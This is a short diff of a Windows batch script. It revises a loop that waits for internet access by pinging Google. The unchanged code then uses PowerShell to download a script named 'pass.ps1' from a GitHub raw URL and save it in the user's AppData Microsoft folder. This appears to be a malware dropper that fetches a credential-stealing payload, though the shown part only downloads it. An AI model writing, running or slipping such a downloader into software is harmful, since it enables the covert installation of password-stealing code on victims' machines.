@@ -1,7 +1,7 @@
 @echo off
-:internet
-ping -n 3 -w 700 google.com | find "bytes="
-IF %ERRORLEVEL% EQU 0 ( goto run ) else ( goto internet )
+:while
+ping www.google.com -n 1 | find "TTL="
+IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )
 
 :run
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Microsoft\pass.ps1"
